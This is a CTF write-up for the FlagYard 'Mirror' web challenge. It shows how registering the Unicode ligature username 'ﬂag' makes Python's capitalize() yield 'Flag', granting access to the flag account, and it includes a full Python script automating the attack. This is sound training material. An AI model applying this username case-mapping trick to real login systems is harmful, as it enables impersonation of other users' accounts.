---
layout: post
title: "FlagYard Mirror Web Challenge"
categories: [CTF Writeup, Web Exploitation]
tags: [FlagYard Writeup, Mirror Challenge, Web Exploitation]
description: "Step-by-Step Writeup for FlagYard's Mirror Web Challenge"
pin: true
---

# Challenge Overview
This writeup provides an automated & manual solution to the "**Mirror**" challenge, which is worth 200 points in the web category on the FlagYard platform. The challenge involves exploiting the login system of the website to extract the flag from `flag.txt`.

![Mirror Challenge](https://i.ibb.co/QfyDVf5/mirror-1.png)

# Application Functionality
The application provides `sign_up`, `account`, and `login` endpoints for account management. Here's how it works:

## Sign-Up:
Users can create an account by submitting a username and password. The password is hashed using MD5, and the username is converted to lowercase before being stored in the database. If the username is taken, an error is shown; otherwise, the user is redirected to the login page.

![Sign-Up page](https://i.ibb.co/QpT3Bcj/mirror-2-signup.png)

## Log-In:
Users log in with their credentials, and if valid, the username is stored in the session with the first letter capitalized and the rest is converted to lower case (e.g., fLag becomes Flag).

![Log-In page](https://i.ibb.co/n001xK3/mirror-1-login.png)

```
if logged_in:
    session['user'] = logged_in['username'].capitalize()
    return redirect(url_for('account'))
```

## Account:
The account dashboard displays the flag.

![Account](https://i.ibb.co/82HzhRH/mirror-3-account.png)

# Exploitation Plan
Now if you take a look closely in the `app.py`:

```
        if user == 'Flag':
            return render_template('account.html', user=user, secret=open('flag.txt').read())
        return render_template('account.html', user=user)
    return redirect('/login')
```

This code means that the application prints the flag in `account.html`, but in order to get the flag we should have the user as `Flag`. But, we cannot enter the user `Flag` or `flag` as it is already registered, and we don't know it's password.

To get the username as `Flag`, we will be using **Homologyphs** in the username.

> **Homologyph:** A homoglyph is a character or letter that looks similar to another character or letter, but has a different meaning. For example, the letter "O" looks similar to the number "0", and the uppercase "I" looks similar to the lowercase "l" in a sans serif font.

So that means we have to use the homologyph of `f` or more letters? Yes! That's right.

In this case we will be using the homologyph of `fl` which I found from this [Website](https://www.compart.com/en/unicode/U+FB02). You can also find variety of homologyphs from this [GitHub Repo](https://github.com/codebox/homoglyph/blob/master/raw_data/chars.txt).

![Homologyph of fl](https://i.ibb.co/gjxNSx1/mirror-5-homologyph.png)

## Exploitation:

1. Firstly, go the the `sign_up` endpoint and register a new user with the `ﬂag` username.
The `ﬂ` used is a homologyph of `fl`.
2. Enter any password, it does not matters.
3. Now go to the `login` page and log-in with the same user and password entered before.
4. You will be prompted to the `account` page where the flag will be displayed :D

![Flag Found](https://i.ibb.co/GvzqKnv/mirror-4-flag.png)

**Flag:** `FlagY{a465936087fffb0eac1029fc61064d48}`

## Exploit Automation:
Here's the python script to automate the process!
```
import requests


BASE_URL = "http://url.playat.flagyard.com"  # Replace with the actual URL
# Do not add a slash (/) after the URL!

USERNAME = "ﬂag"  # Homoglyph for 'flag'
PASSWORD = "password123"  # Dummy password

def register():
    """Registers a new user with the homoglyph username."""
    url = f"{BASE_URL}/sign_up"
    data = {"username": USERNAME, "password": PASSWORD}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("[+] Registration successful.")
    else:
        print("[-] Registration failed.")
        print(response.text)

def login():
    """Logs in with the homoglyph username and retrieves the flag."""
    url = f"{BASE_URL}/login"
    data = {"username": USERNAME, "password": PASSWORD}
    response = requests.post(url, data=data)
    
    if response.status_code == 200 and "Set-Cookie" in response.headers:
        print("[+] Login successful.")
        cookies = response.cookies
        return cookies
    else:
        print("[-] Login failed.")
        print(response.text)
        return None

def get_flag(cookies):
    """Accesses the account page to retrieve the flag."""
    url = f"{BASE_URL}/account"
    response = requests.get(url, cookies=cookies)
    
    if response.status_code == 200 and "Flag" in response.text:
        print("[+] Flag found!")
        flag_start = response.text.find("Flag")
        flag_end = response.text.find("</", flag_start)
        print("Flag:", response.text[flag_start:flag_end])
    else:
        print("[-] Failed to retrieve flag.")
        print(response.text)

if __name__ == "__main__":
    print("[*] Starting exploitation...")
    register()
    cookies = login()
    if cookies:
        get_flag(cookies)
```

---

Happy Hunting! Follow me on [Twitter/X](https://twitter.com/an0nbil) or connect to me on [LinkedIn](https://www.linkedin.com/in/bilal-sec/)!
